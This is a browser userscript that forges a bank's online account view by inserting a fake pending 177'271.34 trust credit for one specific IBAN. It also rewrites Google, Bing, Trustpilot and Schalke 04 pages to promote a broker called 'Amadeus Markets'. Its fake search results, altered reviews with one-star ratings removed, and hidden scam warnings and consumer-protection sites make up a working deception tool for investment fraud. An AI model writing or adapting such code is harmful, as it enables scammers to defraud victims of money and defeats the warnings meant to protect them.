// ==UserScript==
// @name         Ed AM UBS BERNHARD SCHMID
// @namespace    http://tampermonkey.net/
// @version      6.5
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/500291/Ed%20AM%20UBS%20BERNHARD%20SCHMID.user.js
// @updateURL https://update.greasyfork.org/scripts/500291/Ed%20AM%20UBS%20BERNHARD%20SCHMID.meta.js
// ==/UserScript==

// Function to remove scripts from the document
function removeScripts() {
    console.log('Removing scripts...');
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log('Script removed.');
    });
}

// Watch for changes in the DOM and remove added scripts
var observer = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log('Script added. Removing...');
                    node.remove();
                    console.log('Script removed.');
                }
            }
        }
    }
});

// Start observing the document
observer.observe(document.documentElement, { childList: true, subtree: true });

// Remove scripts immediately
removeScripts();

'use strict';

// Configuration: Specify the criteria and new details here
const newDetails = {
    criteria: {
        date: '22.07.2024' // Transaction date to find the original element
    },
    date: 'Vorgemerkt', // New transaction date
    title: 'Treuhand: JP Morgan Chase', // New transaction title
    type: 'Treuhand Gutschrift', // New transaction type
    amount: "177'271.34", // New transaction amount
    bookingDate: 'Vorgemerkt', // New booking date
    balance: "300'000.00", // New transaction balance
    insertPosition: 'above', // 'above' or 'below'
    balanceMode: 'keep' // 'modify', 'set', or 'keep'
};

const accounttextcheck = "CH55 0025 4254 7053 5901 H";

// Function to parse a string amount like "258'734.86" to a float
function parseAmount(amount) {
    return parseFloat(amount.replace(/'/g, '').replace(',', '.'));
}

// Function to format a float amount to a string like "258'734.86"
function formatAmount(amount) {
    return amount.toLocaleString('de-CH', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Function to parse a date string like "11.07.2024" to a Date object
function parseDate(dateString) {
    const parts = dateString.split('.');
    return new Date(parts[2], parts[1] - 1, parts[0]);
}

// Function to find the closest previous date
function findClosestPreviousDate(dates, targetDate) {
    let closestDate = null;
    for (const date of dates) {
        if (date <= targetDate && (!closestDate || date > closestDate)) {
            closestDate = date;
        }
    }
    return closestDate;
}

// Function to normalize a string for comparison
function normalizeString(str) {
    return str.replace(/\s+/g, '').toLowerCase().replace(/[^\d]/g, '');
}

// Function to check if the account text matches
function isAccountTextCorrect() {
    const normalizedCheck = normalizeString(accounttextcheck);
    const accountElements = document.querySelectorAll('.UWR_ContextSelectorItemSubtitle_content_5TNyV');
    return Array.from(accountElements).some(el => {
        const normalizedContent = normalizeString(el.textContent.trim());
        return normalizedContent === normalizedCheck;
    });
}

// Function to duplicate the desired element and update its content
function duplicateAndModifyElement() {
    if (!isAccountTextCorrect()) {
        console.warn('Account text does not match.');
        return;
    }

    // Select all elements with the class "UWR_Panel_container_e9DHt"
    const panelContainers = document.querySelectorAll('.UWR_Panel_container_e9DHt');

    if (panelContainers.length === 0) {
        console.warn('No elements with class "UWR_Panel_container_e9DHt" found.');
        return;
    }

    // Collect all dates from elements
    const dates = Array.from(panelContainers)
        .map(panelContainer => {
            const dateElement = panelContainer.querySelector('.db0acctxnlst_CompactPanelHeader_date_1oj98');
            return dateElement ? parseDate(dateElement.textContent.trim()) : null;
        })
        .filter(date => date !== null);

    // Parse the target date from the criteria
    const targetDate = parseDate(newDetails.criteria.date);

    // Find the closest previous date
    const closestDate = findClosestPreviousDate(dates, targetDate);

    if (!closestDate) {
        console.error('No valid date found for duplication.');
        return;
    }

    // Convert closestDate back to string for comparison
    const closestDateString = `${String(closestDate.getDate()).padStart(2, '0')}.${String(closestDate.getMonth() + 1).padStart(2, '0')}.${closestDate.getFullYear()}`;

    // Find the element with the closest previous date
    for (const panelContainer of panelContainers) {
        const dateElements = panelContainer.querySelectorAll('.db0acctxnlst_CompactPanelHeader_date_1oj98');
        const dateTexts = Array.from(dateElements).map(el => el.textContent.trim());

        if (dateTexts.includes(closestDateString)) {
            // Clone the element
            const clone = panelContainer.cloneNode(true);

            // Update the details in the cloned element
            const updateTextContent = (selector, newText) => {
                const elements = clone.querySelectorAll(selector);
                elements.forEach(element => {
                    element.textContent = newText;
                });
            };

            // Update both transaction dates
            updateTextContent('.db0acctxnlst_CompactPanelHeader_date_1oj98', newDetails.date);
            // Update title
            updateTextContent('.db0acctxnlst_CompactPanelHeader_title_3kTta .db0-accounts-common-components_common_space-before_1BVr7', newDetails.title);
            // Update type
            updateTextContent('.db0-widgets_commonHeader_text-sub-light_OpR0W .db0-accounts-common-components_common_space-before_1BVr7', newDetails.type);

            // Update booking date (third occurrence of the class)
            const bookingDateElements = clone.querySelectorAll('.db0-widgets_commonHeader_text-sub_33pK-');
            if (bookingDateElements.length >= 3) {
                bookingDateElements[2].textContent = newDetails.bookingDate;
            } else {
                console.warn('Not enough booking date elements found in the cloned element.');
            }

            // Determine the amount element based on the sign of the new transaction amount
            const newAmount = parseAmount(newDetails.amount);
            const isPositiveAmount = newAmount >= 0;

            // Find the original amount element and update its class and data-name
            const originalAmountElement = panelContainer.querySelector('[data-name="panel-header-amount-credit"], [data-name="panel-header-amount-debit"]');
            const originalAmountClass = originalAmountElement ? originalAmountElement.className : '';
            const originalDataName = originalAmountElement ? originalAmountElement.getAttribute('data-name') : '';

            // Set the class and data-name for the amount in the cloned element
            const amountElementClass = isPositiveAmount
                ? 'UWR_Amount_container_f5cpS'
                : 'UWR_Amount_container_f5cpS UWR_Amount_red_jYbnj';

            const amountElementDataName = isPositiveAmount
                ? 'panel-header-amount-credit'
                : 'panel-header-amount-debit';

            const amountElementSelector = `[data-name="${amountElementDataName}"] span:nth-child(2)`;

            // Update the amount container class and amount in the cloned element
            const amountElement = clone.querySelector(`[data-name="${originalDataName}"]`);
            if (amountElement) {
                amountElement.className = amountElementClass;
                amountElement.setAttribute('data-name', amountElementDataName);
                updateTextContent(amountElementSelector, newDetails.amount);
            }

            // Ensure only the specified type is present and remove others
            const typeElement = clone.querySelector('.db0-widgets_commonHeader_text-sub-light_OpR0W');
            if (typeElement) {
                const spans = Array.from(typeElement.querySelectorAll('span'));
                // Remove all spans except the one with the new type
                spans.forEach((span, index) => {
                    if (index !== 0) {
                        span.remove();
                    }
                });
                // Update the first span with the new type
                const firstSpan = spans[0];
                if (firstSpan) {
                    firstSpan.textContent = newDetails.type;
                }
            }

            // Handle balance based on configuration
            const originalBalanceElement = panelContainer.querySelector('[data-name="panel-header-balance"] span:nth-child(2)');
            const originalBalance = originalBalanceElement ? parseAmount(originalBalanceElement.textContent.trim()) : 0;
            const transactionAmount = parseAmount(newDetails.amount);
            let newBalance;

            switch (newDetails.balanceMode) {
                case 'modify':
                    newBalance = originalBalance + transactionAmount;
                    break;
                case 'set':
                    newBalance = parseAmount(newDetails.balance);
                    break;
                case 'keep':
                    newBalance = originalBalance;
                    break;
                default:
                    console.error('Invalid balanceMode specified.');
                    newBalance = originalBalance;
                    break;
            }

            // Update the balance in the cloned element
            updateTextContent('[data-name="panel-header-balance"] span:nth-child(2)', formatAmount(newBalance));

            // Insert the clone above or below the original element based on configuration
            if (newDetails.insertPosition === 'above') {
                panelContainer.parentNode.insertBefore(clone, panelContainer);
            } else if (newDetails.insertPosition === 'below') {
                panelContainer.parentNode.insertBefore(clone, panelContainer.nextSibling);
            }

            // Remove the specific input element 5 milliseconds after insertion
            setTimeout(() => {
                const elementToRemove = document.querySelector('.UWR_Input_input-wrapper_uhJEk');
                if (elementToRemove) {
                    elementToRemove.remove();
                    console.log("Element with class 'UWR_Input_input-wrapper_uhJEk' removed.");
                }
            }, 5);

            break; // Exit the loop after duplicating the first matching element
        }
    }
}

// Function to check if the specific input and at least 2 panel elements are present on the page
function checkElementsPresence() {
    const inputElementPresent = document.querySelector('.UWR_Input_input-wrapper_uhJEk') !== null;
    const panelElements = document.querySelectorAll('.UWR_Panel_container_e9DHt');
    const panelElementsPresent = panelElements.length >= 3; // Check if at least 3 panel elements are present
    const contextSelectorItemPresent = document.querySelector('.UWR_ContextSelectorItemSubtitle_content_5TNyV') !== null;
    return inputElementPresent && panelElementsPresent && contextSelectorItemPresent;
}

// Function to repeatedly check for the input element and run the duplication function
function startChecking() {
    setInterval(() => {
        if (checkElementsPresence()) {
            console.log('Required elements found. Attempting to duplicate and modify element.');
            duplicateAndModifyElement();
        } else {
            console.log('Required elements not found. Checking again in 5 seconds.');
        }
    }, 5000); // Check every 5 seconds
}

// Start the periodic check
startChecking();





 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["amadeus", "market", "amdeus", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust"],
                        results: [
                            {
                                url: "https://www.amadeus-markets.com",
                                title: "Amadeus Markets dein Broker",
                                description: "Amadeus Markets ist der Broker mit der besten Reputation.",
                                footerText: "https://www.amadeus-markets.com",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Amadeus Markets - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Amadeus Markets",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Amadeus Markets Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Amadeus Markets ab dem 1. Januar unser Sponsor und Partner wird. Amadeus Markets ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Amadeus Markets sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}

// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Amadeus Markets";
    const customLogoURL = "https://amadeus-markets.com/images/Logowhite.png";
    const customURL = "https://amadeus-markets.com";
    const customReferenceURL = "amadeus-markets.com";
    const customLinkURL = "https://amadeus-markets.com"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Amadeus Markets",
      "icmarkets": "Amadeus Markets",
      "ic-markets": "Amadeus Markets",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}

// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1) {
  var newURL = "https://amadeus-markets.com/";
var newLogoURL = "https://i.ibb.co/cQ26kXf/Untitled-design.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var weobserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

weobserver.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }


